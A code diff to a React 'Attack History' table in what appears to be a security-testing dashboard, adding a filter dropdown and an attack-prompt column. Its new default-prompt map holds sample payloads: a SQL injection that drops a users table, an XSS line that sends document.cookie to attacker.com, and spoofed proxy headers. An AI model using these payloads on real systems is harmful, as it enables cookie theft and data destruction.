@@ -1,4 +1,4 @@
-import React, { useState, useEffect, useMemo, useCallback } from "react";
+import React, { useState, useEffect, useMemo, useCallback, useRef } from "react";
 import {
   Search,
   Plus,
@@ -23,17 +23,18 @@ import {
   Filter,
   RefreshCw,
   Loader2,
+  Check,
 } from "lucide-react";
 import { toast } from "sonner";
 import GradientWaves from "@/animations/GradientWaves";
 import { attackApi } from "@/lib/api";
 import AttackDetailView from "./AttackDetailView";
 
-const CATEGORY_CHIPS = [
-  { id: "all", label: "All Types" },
-  { id: "ddos", label: "DDoS" },
+const ATTACK_FILTER_OPTIONS = [
+  { id: "all", label: "All Attacks" },
+  { id: "ddos", label: "DDoS Simulation" },
   { id: "sql injection", label: "SQL Injection" },
-  { id: "cross-site scripting", label: "XSS" },
+  { id: "cross-site scripting", label: "Cross-Site Scripting (XSS)" },
   { id: "data exfiltration", label: "Data Exfiltration" },
   { id: "origin & proxy", label: "Origin & Proxy" },
 ];
@@ -71,9 +72,35 @@ function normalizeBackendAttack(item, userEmail) {
   const category =
     item.category || categoryMap[attackType] || attackType.replace(/_/g, " ");
 
+  const defaultPrompts = {
+    "sql injection": "admin' OR 1=1; DROP TABLE users; --",
+    "cross-site scripting": "<script>fetch('http://attacker.com/leak?cookie=' + document.cookie)</script>",
+    "ddos simulation": "SYN Flood / Concurrency surge: 10,000 rps on /api/v1/auth",
+    "data exfiltration": "GET /internal/db/dump?export=all&token=stolen_bearer",
+    "origin & proxy": "X-Forwarded-Host: evil.internal; X-Origin-Override: 127.0.0.1",
+  };
+
+  const cleanCategory = category.toLowerCase();
+  const fallbackPrompt = defaultPrompts[cleanCategory] || "GET /api/v1/audit?payload=exploit_vector_scan";
+
+  const payloadStr =
+    item.attack_prompt ||
+    item.prompt ||
+    item.payload ||
+    (item.request?.request?.body
+      ? typeof item.request.request.body === "object"
+        ? JSON.stringify(item.request.request.body)
+        : String(item.request.request.body)
+      : targetObj.query_params
+      ? typeof targetObj.query_params === "object"
+        ? JSON.stringify(targetObj.query_params)
+        : String(targetObj.query_params)
+      : fallbackPrompt);
+
   const name =
-    item.name ||
-    `[${category.toUpperCase()}] ${targetObj.endpoint || targetStr}`;
+    item.name && !item.name.startsWith("[")
+      ? item.name
+      : category;
 
   const vector =
     item.vector ||
@@ -97,14 +124,6 @@ function normalizeBackendAttack(item, userEmail) {
         minute: "2-digit",
       })
     : "Recently";
-
-  const payloadStr =
-    item.payload ||
-    (item.request?.request?.body
-      ? JSON.stringify(item.request.request.body)
-      : targetObj.query_params
-      ? JSON.stringify(targetObj.query_params)
-      : `${targetObj.method || "GET"} ${targetObj.endpoint || "/"}`);
 
   const attempted =
     item.status?.progress?.attempted_requests ??
@@ -142,6 +161,7 @@ function normalizeBackendAttack(item, userEmail) {
     executedAt: formattedDate,
     authorEmail: item.authorEmail || userEmail || "security@threatlens.io",
     payload: payloadStr,
+    attackPrompt: payloadStr,
     responseSummary,
     duration,
   };
@@ -158,9 +178,31 @@ export default function AttackHistoryTab({
   const [isRefreshing, setIsRefreshing] = useState(false);
   const [searchQuery, setSearchQuery] = useState("");
   const [categoryFilter, setCategoryFilter] = useState("all");
+  const [isFilterDropdownOpen, setIsFilterDropdownOpen] = useState(false);
   const [activeMenuId, setActiveMenuId] = useState(null);
   const [rowsPerPage] = useState(25);
   const [currentPage] = useState(1);
+
+  const filterDropdownRef = useRef(null);
+
+  // Close filter dropdown on outside click
+  useEffect(() => {
+    function handleClickOutside(event) {
+      if (
+        filterDropdownRef.current &&
+        !filterDropdownRef.current.contains(event.target)
+      ) {
+        setIsFilterDropdownOpen(false);
+      }
+      if (!event.target.closest(".action-menu-container")) {
+        setActiveMenuId(null);
+      }
+    }
+    document.addEventListener("mousedown", handleClickOutside);
+    return () => {
+      document.removeEventListener("mousedown", handleClickOutside);
+    };
+  }, []);
 
   // Attack Modal States
   const [isNewAttackOpen, setIsNewAttackOpen] = useState(false);
@@ -179,6 +221,22 @@ export default function AttackHistoryTab({
   const handleSelectAttack = externalOnSelectAttack || setLocalSelectedAttack;
 
   const currentUserEmail = user?.email || "admin@threatlens.io";
+
+  // Dynamic filter options based on predefined list + any unique categories in active data
+  const filterOptions = useMemo(() => {
+    const knownIds = new Set(ATTACK_FILTER_OPTIONS.map((o) => o.id));
+    const dynamicList = [];
+    attacks.forEach((a) => {
+      if (a.category && !knownIds.has(a.category.toLowerCase())) {
+        knownIds.add(a.category.toLowerCase());
+        dynamicList.push({
+          id: a.category.toLowerCase(),
+          label: a.category,
+        });
+      }
+    });
+    return [...ATTACK_FILTER_OPTIONS, ...dynamicList];
+  }, [attacks]);
 
   // Load live backend attacks from actual API
   const loadBackendAttacks = useCallback(async (showToast = false) => {
@@ -226,12 +284,14 @@ export default function AttackHistoryTab({
         a.name?.toLowerCase().includes(query) ||
         a.category?.toLowerCase().includes(query) ||
         a.target?.toLowerCase().includes(query) ||
+        a.attackPrompt?.toLowerCase().includes(query) ||
         a.vector?.toLowerCase().includes(query) ||
         a.authorEmail?.toLowerCase().includes(query);
 
       const matchesCategory =
         categoryFilter === "all" ||
         a.category?.toLowerCase().includes(categoryFilter.toLowerCase()) ||
+        a.name?.toLowerCase().includes(categoryFilter.toLowerCase()) ||
         (categoryFilter === "ddos" && a.category?.toLowerCase().includes("ddos")) ||
         (categoryFilter === "sql injection" && a.category?.toLowerCase().includes("sql")) ||
         (categoryFilter === "cross-site scripting" && (a.category?.toLowerCase().includes("xss") || a.category?.toLowerCase().includes("script"))) ||
@@ -259,6 +319,7 @@ export default function AttackHistoryTab({
       status_text: newAttackStatus,
       vector: newAttackVector.trim() || "Automated Adversarial Simulation",
       payload: newAttackPayload.trim() || "Adversarial test payload",
+      attack_prompt: newAttackPayload.trim() || "Adversarial test payload",
       responseSummary: newAttackResponse.trim() || "Security controls enforced.",
       request: {
         target: {
@@ -376,6 +437,9 @@ export default function AttackHistoryTab({
     }
   };
 
+  const activeFilterLabel =
+    filterOptions.find((opt) => opt.id === categoryFilter)?.label || "All Attacks";
+
   // If an attack is selected, render the dedicated full-page AttackDetailView
   if (selectedAttack) {
     return (
@@ -409,15 +473,9 @@ export default function AttackHistoryTab({
         {/* Top Header & Action Controls */}
         <div className="flex flex-wrap items-center justify-between gap-4 pb-1">
           <div>
-            <h1 className="text-xl font-bold tracking-tight text-white flex items-center gap-2.5">
-              <span>Attacks History</span>
-              <span className="px-2 py-0.5 rounded-md bg-rose-500/10 border border-rose-500/20 text-rose-400 text-[11px] font-mono font-medium">
-                {isLoading ? "loading..." : `${attacks.length} events`}
-              </span>
+            <h1 className="text-2xl font-bold tracking-tight text-[#FFFFFF]">
+              Attacks History
             </h1>
-            <p className="text-xs text-[#8a99ad] mt-0.5">
-              Live audit traces of real penetration attacks & red-team evaluations recorded by ThreatLens
-            </p>
           </div>
 
           <div className="flex items-center gap-2.5">
@@ -425,7 +483,7 @@ export default function AttackHistoryTab({
             <button
               onClick={() => loadBackendAttacks(true)}
               disabled={isRefreshing}
-              className="px-3.5 py-2 rounded-xl bg-[#131d2b] hover:bg-[#1a273a] border border-[#223348] text-[#8a99ad] hover:text-white font-medium text-xs transition-all cursor-pointer flex items-center gap-1.5 active:scale-95 disabled:opacity-60"
+              className="px-3.5 py-2 rounded-xl bg-black hover:bg-[#1a273a] border border-[#223348] text-[#8a99ad] hover:text-white font-medium text-xs transition-all cursor-pointer flex items-center gap-1.5 active:scale-95 disabled:opacity-60"
               title="Refresh live attack records"
             >
               <RefreshCw className={`w-3.5 h-3.5 ${isRefreshing ? "animate-spin text-rose-400" : ""}`} />
@@ -435,37 +493,84 @@ export default function AttackHistoryTab({
         </div>
 
         {/* Card Container */}
-        <div className="bg-[#121924]/90 backdrop-blur-md border border-[#1e2c3e] rounded-2xl p-6 shadow-2xl space-y-6">
-          {/* Toolbar: Search & Category Filter Chips */}
+        <div className="bg-black backdrop-blur-md border border-[#1e2c3e] rounded-2xl p-6 shadow-2xl space-y-6">
+          {/* Toolbar: Search & Filter Button */}
           <div className="flex flex-wrap items-center justify-between gap-4">
             <div className="flex flex-wrap items-center gap-3 flex-1 min-w-[280px]">
+              {/* Search Bar */}
               <div className="relative w-full max-w-sm">
                 <Search className="w-4 h-4 text-[#8a99ad] absolute left-3.5 top-1/2 -translate-y-1/2" />
                 <input
                   type="text"
                   value={searchQuery}
                   onChange={(e) => setSearchQuery(e.target.value)}
-                  placeholder="Search attack vector, category, target endpoint..."
-                  className="w-full pl-10 pr-4 py-2 bg-[#0c121a] border border-[#223145] rounded-xl text-xs text-white placeholder-[#8a99ad] focus:border-rose-400 focus:outline-none transition-colors"
+                  placeholder="Search attack name, prompt, target..."
+                  className="w-full pl-10 pr-4 py-2 bg-black border border-[#223145] rounded-xl text-xs text-white placeholder-[#8a99ad] focus:border-rose-400 focus:outline-none transition-colors"
                 />
               </div>
 
-              {/* Category Filter Chips */}
-              <div className="flex items-center gap-1.5 overflow-x-auto py-1">
-                {CATEGORY_CHIPS.map((cat) => (
-                  <button
-                    key={cat.id}
-                    onClick={() => setCategoryFilter(cat.id)}
-                    className={`px-2.5 py-1 rounded-lg text-[11px] font-medium transition-colors whitespace-nowrap cursor-pointer ${
-                      categoryFilter === cat.id
-                        ? "bg-rose-500/20 text-rose-300 border border-rose-500/40"
-                        : "bg-[#0c121a] text-[#8a99ad] hover:text-white border border-[#223145]"
+              {/* Filter Button on the right side of the search bar */}
+              <div className="relative" ref={filterDropdownRef}>
+                <button
+                  type="button"
+                  onClick={() => setIsFilterDropdownOpen((prev) => !prev)}
+                  className={`px-3.5 py-2 rounded-xl border text-xs font-medium transition-all cursor-pointer flex items-center gap-2 select-none ${
+                    categoryFilter !== "all"
+                      ? "bg-rose-500/15 border-rose-500/40 text-rose-300 shadow-[0_0_12px_rgba(244,63,94,0.15)]"
+                      : "bg-black hover:bg-[#151f2b] border-[#223145] text-[#8a99ad] hover:text-white"
+                  }`}
+                >
+                  <Filter className="w-3.5 h-3.5 text-rose-400" />
+                  <span>{categoryFilter === "all" ? "Filter" : activeFilterLabel}</span>
+                  <ChevronDown
+                    className={`w-3.5 h-3.5 transition-transform duration-200 ${
+                      isFilterDropdownOpen ? "rotate-180 text-rose-400" : "text-[#8a99ad]"
                     }`}
-                  >
-                    {cat.label}
-                  </button>
-                ))}
+                  />
+                </button>
+
+                {/* Dropdown Menu with all attack names */}
+                {isFilterDropdownOpen && (
+                  <div className="absolute left-0 mt-2 w-60 rounded-xl bg-black border border-[#233348] shadow-2xl p-1.5 z-50 select-none">
+                    <div className="px-2.5 py-1.5 text-[10px] font-semibold text-[#8a99ad] uppercase tracking-wider">
+                      Attack Types
+                    </div>
+                    <div className="space-y-0.5 max-h-64 overflow-y-auto">
+                      {filterOptions.map((cat) => {
+                        const isSelected = categoryFilter === cat.id;
+                        return (
+                          <button
+                            key={cat.id}
+                            onClick={() => {
+                              setCategoryFilter(cat.id);
+                              setIsFilterDropdownOpen(false);
+                            }}
+                            className={`w-full flex items-center justify-between px-3 py-2 rounded-lg text-xs transition-colors cursor-pointer text-left ${
+                              isSelected
+                                ? "bg-rose-500/20 text-rose-300 font-semibold"
+                                : "text-[#d8e2e8] hover:text-white hover:bg-white/[0.06]"
+                            }`}
+                          >
+                            <span>{cat.label}</span>
+                            {isSelected && (
+                              <Check className="w-3.5 h-3.5 text-rose-400" />
+                            )}
+                          </button>
+                        );
+                      })}
+                    </div>
+                  </div>
+                )}
               </div>
+
+              {categoryFilter !== "all" && (
+                <button
+                  onClick={() => setCategoryFilter("all")}
+                  className="text-[11px] text-[#8a99ad] hover:text-rose-400 transition-colors underline cursor-pointer"
+                >
+                  Clear filter
+                </button>
+              )}
             </div>
 
             <div className="text-xs text-[#8a99ad] font-mono">
@@ -481,6 +586,7 @@ export default function AttackHistoryTab({
               <thead>
                 <tr className="border-b border-[#1b2636] text-[12px] font-semibold text-[#8a99ad]">
                   <th className="pb-3.5 font-medium">Attack Name</th>
+                  <th className="pb-3.5 font-medium">Attack Prompt</th>
                   <th className="pb-3.5 font-medium">Severity & Result</th>
                   <th className="pb-3.5 font-medium">Target Endpoint</th>
                   <th className="pb-3.5 font-medium cursor-pointer flex items-center gap-1">
@@ -493,7 +599,7 @@ export default function AttackHistoryTab({
               <tbody className="divide-y divide-[#182332]">
                 {isLoading ? (
                   <tr>
-                    <td colSpan={5} className="py-16 text-center">
+                    <td colSpan={6} className="py-16 text-center">
                       <div className="flex flex-col items-center justify-center gap-2">
                         <Loader2 className="w-6 h-6 text-rose-400 animate-spin" />
                         <span className="text-xs text-[#8a99ad]">Loading live attack records from API...</span>
@@ -502,7 +608,7 @@ export default function AttackHistoryTab({
                   </tr>
                 ) : filteredAttacks.length === 0 ? (
                   <tr>
-                    <td colSpan={5} className="py-16 text-center">
+                    <td colSpan={6} className="py-16 text-center">
                       <div className="flex flex-col items-center justify-center space-y-3">
                         <div className="w-12 h-12 rounded-2xl bg-rose-500/10 border border-rose-500/20 flex items-center justify-center">
                           <Crosshair className="w-6 h-6 text-rose-400" />
@@ -535,23 +641,28 @@ export default function AttackHistoryTab({
                         onClick={() => handleSelectAttack(a)}
                         className="hover:bg-white/[0.02] transition-colors cursor-pointer group"
                       >
-                        {/* Attack Name & Category */}
-                        <td className="py-3.5 pr-4 align-middle">
-                          <div className="flex items-center gap-2.5">
-                            <span className="text-[13px] font-semibold text-white group-hover:text-rose-400 transition-colors">
-                              {a.name}
-                            </span>
-                            <span className="bg-[#1a1218] border border-rose-500/20 text-rose-300 text-[10.5px] font-mono px-2 py-0.5 rounded font-medium shrink-0">
-                              {a.category}
-                            </span>
+                        {/* 1) Attack Name */}
+                        <td className="py-3.5 pr-4 align-middle whitespace-nowrap">
+                          <span className="text-[13px] font-semibold text-white group-hover:text-rose-400 transition-colors">
+                            {a.name || a.category}
+                          </span>
+                        </td>
+
+                        {/* 2) Attack Prompt */}
+                        <td className="py-3.5 px-4 align-middle max-w-[280px] lg:max-w-[420px]">
+                          <div
+                            className="bg-black border border-[#1e2d3d] px-2.5 py-1.5 rounded-lg text-[11.5px] font-mono text-[#94a3b8] truncate group-hover:border-rose-500/30 group-hover:text-slate-200 transition-colors"
+                            title={a.attackPrompt || a.payload}
+                          >
+                            {a.attackPrompt || a.payload || "—"}
                           </div>
                         </td>
 
-                        {/* Severity & Outcome Status */}
-                        <td className="py-4 px-4 align-middle whitespace-nowrap">
+                        {/* 3) Severity & Result (Simplified) */}
+                        <td className="py-3.5 px-4 align-middle whitespace-nowrap">
                           <div className="flex items-center gap-2">
                             <span
-                              className={`px-2 py-0.5 rounded text-[10.5px] font-bold uppercase tracking-wider border ${getSeverityBadgeClass(
+                              className={`px-2 py-0.5 rounded text-[10.5px] font-semibold border ${getSeverityBadgeClass(
                                 a.severity
                               )}`}
                             >
@@ -559,7 +670,7 @@ export default function AttackHistoryTab({
                             </span>
 
                             <span
-                              className={`px-2 py-0.5 rounded text-[10.5px] font-semibold flex items-center gap-1 border ${statusMeta.class}`}
+                              className={`px-2 py-0.5 rounded text-[10.5px] font-medium flex items-center gap-1 border ${statusMeta.class}`}
                             >
                               <StatusIcon className="w-3 h-3" />
                               <span>{a.status}</span>
@@ -567,16 +678,16 @@ export default function AttackHistoryTab({
                           </div>
                         </td>
 
-                        {/* Target Endpoint */}
-                        <td className="py-4 px-4 align-middle whitespace-nowrap">
+                        {/* 4) Target Endpoint */}
+                        <td className="py-3.5 px-4 align-middle whitespace-nowrap">
                           <div className="flex items-center gap-2 text-xs text-[#d8e2e8]">
                             <Bot className="w-3.5 h-3.5 text-[#38bdf8]" />
                             <span className="font-mono text-white text-[11.5px]">{a.target}</span>
                           </div>
                         </td>
 
-                        {/* Executed At & Performed By */}
-                        <td className="py-4 px-4 align-middle whitespace-nowrap">
+                        {/* 5) Executed At & Performed By */}
+                        <td className="py-3.5 px-4 align-middle whitespace-nowrap">
                           <div className="text-xs text-[#e2e8f0] font-normal">
                             {a.executedAt}
                           </div>
@@ -585,8 +696,8 @@ export default function AttackHistoryTab({
                           </div>
                         </td>
 
-                        {/* Menu Actions */}
-                        <td className="py-4 pl-2 pr-1 text-right align-middle relative">
+                        {/* 6) Menu Actions */}
+                        <td className="py-3.5 pl-2 pr-1 text-right align-middle relative action-menu-container">
                           <button
                             onClick={(e) => {
                               e.stopPropagation();
@@ -601,14 +712,14 @@ export default function AttackHistoryTab({
                           {activeMenuId === a.id && (
                             <div
                               onClick={(e) => e.stopPropagation()}
-                              className="absolute right-0 top-12 w-48 rounded-xl bg-[#0e1620] border border-[#233348] shadow-2xl p-1.5 z-50 select-none text-left"
+                              className="absolute right-0 top-12 w-48 rounded-xl bg-black border border-[#233348] shadow-2xl p-1.5 z-50 select-none text-left"
                             >
                               <button
-                                onClick={() => handleCopyText(a.payload, "Attack payload")}
+                                onClick={() => handleCopyText(a.attackPrompt || a.payload, "Attack prompt")}
                                 className="w-full flex items-center gap-2.5 px-3 py-2 rounded-lg text-xs text-[#d8e2e8] hover:text-white hover:bg-white/[0.06] transition-colors cursor-pointer"
                               >
                                 <Copy className="w-3.5 h-3.5 text-[#8a99ad]" />
-                                <span>Copy payload</span>
+                                <span>Copy attack prompt</span>
                               </button>
 
                               <button
@@ -646,7 +757,7 @@ export default function AttackHistoryTab({
               <span>Rows</span>
               <button
                 onClick={() => toast.info("Rows per page: 25")}
-                className="flex items-center gap-1.5 px-2 py-1 bg-[#0e1620] border border-[#23344b] rounded text-white text-xs cursor-pointer"
+                className="flex items-center gap-1.5 px-2 py-1 bg-black border border-[#23344b] rounded text-white text-xs cursor-pointer"
               >
                 <span>{rowsPerPage}</span>
                 <ChevronDown className="w-3 h-3 text-[#8a99ad]" />
